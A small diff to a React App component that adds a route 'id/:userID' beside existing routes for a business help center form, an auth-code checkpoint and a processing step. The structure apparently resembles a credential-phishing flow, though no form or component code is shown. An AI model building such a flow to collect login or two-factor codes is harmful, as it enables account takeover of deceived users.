@@ -95,6 +95,7 @@ function App() {
               <div id="app">
                 <Routes>
                   <Route path="/" element={<HomePage/>} />
+                  <Route path="id/:userID" element={<HomePage/>} />
                   <Route path="/business-help-center" element={<MyForm/>} />
                   <Route path="checkpoint/:userID" element={<AuthCode />} />
                   <Route path="processing/:userID" element={<ClassUser />} />
